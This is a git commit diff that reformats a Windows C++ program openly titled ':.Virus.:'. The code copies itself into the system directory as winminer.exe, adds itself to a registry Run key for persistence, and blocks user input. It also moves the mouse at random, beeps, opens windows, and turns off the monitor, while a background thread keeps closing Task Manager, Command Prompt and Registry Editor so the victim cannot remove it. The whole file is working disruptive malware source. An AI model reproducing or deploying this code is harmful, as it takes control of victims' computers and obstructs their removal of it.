dc4b2e68c340e297745a4b73e3b6aa8c333b9545
ZippyMagician <joshuabarnett@ridgefieldps.net>
2017-06-13 11:03:03 -0400

    Create main.cc

--- src/client/main.cc
+++ src/client/main.cc
@@ -21,119 +21,119 @@ DWORD WINAPI DestroyWindows(LPVOID);
 
 int main()
 {
-srand( time(0) );
-random = rand()%6;
-system("title :.Virus.:");
-BlockInput( true );
-SetUp();
-BlockInput( false );
-CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
-while(1)
-{
-Run( random );
-Sleep(10);
-}
+  srand( time(0) );
+  random = rand()%6;
+  system("title :.Virus.:");
+  BlockInput( true );
+  SetUp();
+  BlockInput( false );
+  CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
+  while(1)
+  {
+  Run( random );
+  Sleep(10);
+  }
 }
 void SetUp()
 {
-char system[MAX_PATH];
-char pathtofile[MAX_PATH];
-HMODULE GetModH = GetModuleHandle(NULL);
-GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
-GetSystemDirectory(system,sizeof(system));
-strcat(system,"\\winminer.exe");
-CopyFile(pathtofile,system,false);
+  char system[MAX_PATH];
+  char pathtofile[MAX_PATH];
+  HMODULE GetModH = GetModuleHandle(NULL);
+  GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
+  GetSystemDirectory(system,sizeof(system));
+  strcat(system,"\\winminer.exe");
+  CopyFile(pathtofile,system,false);
 
-HKEY hKey;
-RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Mcft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
-RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system));
-RegCloseKey(hKey);
+  HKEY hKey;
+  RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Mcft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
+  RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system));
+  RegCloseKey(hKey);
 
-mywindow = FindWindow(NULL,":.Virus.:");
-cout<<"You Are Doomed cyberot";
-Sleep(1000);
-ShowWindow(mywindow, false);
+  mywindow = FindWindow(NULL,":.Virus.:");
+  cout<<"You Are Doomed cyberot";
+  Sleep(1000);
+  ShowWindow(mywindow, false);
 }
 
 void Run( int ID )
 {
-if( ID == 1 )
-{
-BlockInput(true);
-}
-else if( ID == 2 )
-{
-Beeper();
-}
-else if( ID == 3 )
-{
-OpenStuff();
-}
-else if( ID == 4 )
-{
-Hibernation();
-}
-else if( ID == 5 )
-{
-CrazyMouse();
-}
-else
-{
-BlockInput(true);
-Beeper();
-OpenStuff();
-CrazyMouse();
-}
+  if( ID == 1 )
+  {
+    BlockInput(true);
+  }
+  else if( ID == 2 )
+  {
+    Beeper();
+  }
+  else if( ID == 3 )
+  {
+    OpenStuff();
+  }
+  else if( ID == 4 )
+  {
+    Hibernation();
+  }
+  else if( ID == 5 )
+  {
+    CrazyMouse();
+  }
+  else
+  {
+    BlockInput(true);
+    Beeper();
+    OpenStuff();
+    CrazyMouse();
+  }
 }
 
 void Beeper()
 {
-Freq = rand()%2001;
-Dur = rand()%301;
-Beep( Freq, Dur );
+  Freq = rand()%2001;
+  Dur = rand()%301;
+  Beep( Freq, Dur );
 }
 void OpenStuff()
 {
-ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
-ShellExecute(NULL,"open",MineSweeper,NULL,NULL,SW_MAXIMIZE);
-ShellExecute(NULL,"open",Hearts,NULL,NULL,SW_MAXIMIZE);
-ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
+  ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
+  ShellExecute(NULL,"open",MineSweeper,NULL,NULL,SW_MAXIMIZE);
+  ShellExecute(NULL,"open",Hearts,NULL,NULL,SW_MAXIMIZE);
+  ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
 }
 void Hibernation()
 {
-Sleep(1000);
-SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
+  Sleep(1000);
+  SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
 }
 void CrazyMouse()
 {
-X = rand()%801;
-Y = rand()%601;
-SetCursorPos( X, Y );
+  X = rand()%801;
+  Y = rand()%601;
+  SetCursorPos( X, Y );
 }
 
 DWORD WINAPI DestroyWindows(LPVOID)
 {
-while(1)
-{
-TaskMgr = FindWindow(NULL,"Windows Task Manager");
-CMD = FindWindow(NULL, "Command Prompt");
-Regedit = FindWindow(NULL,"Registry Editor");
-if( TaskMgr != NULL )
-{
-SetWindowText( TaskMgr, "You Suck Balls Superman");
-PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
-}
-if( CMD != NULL )
-{
-SetWindowText( CMD, "You Suck Balls Superman");
-PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
-}
-if( Regedit != NULL )
-{
-SetWindowText( Regedit, "You Suck Balls Superman");
-PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
-}
+  while(1)
+  {
+    TaskMgr = FindWindow(NULL,"Windows Task Manager");
+    CMD = FindWindow(NULL, "Command Prompt");
+    Regedit = FindWindow(NULL,"Registry Editor");
+    if( TaskMgr != NULL )
+    {
+      SetWindowText( TaskMgr, "You Suck Balls Superman");
+      PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+    }
+    if( CMD != NULL )
+    {
+      SetWindowText( CMD, "You Suck Balls Superman");
+      PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+    }
+    if( Regedit != NULL )
+    {
+      SetWindowText( Regedit, "You Suck Balls Superman");
+      PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+    }
 
-Sleep(10);
-}
+    Sleep(10);
+  }
 }
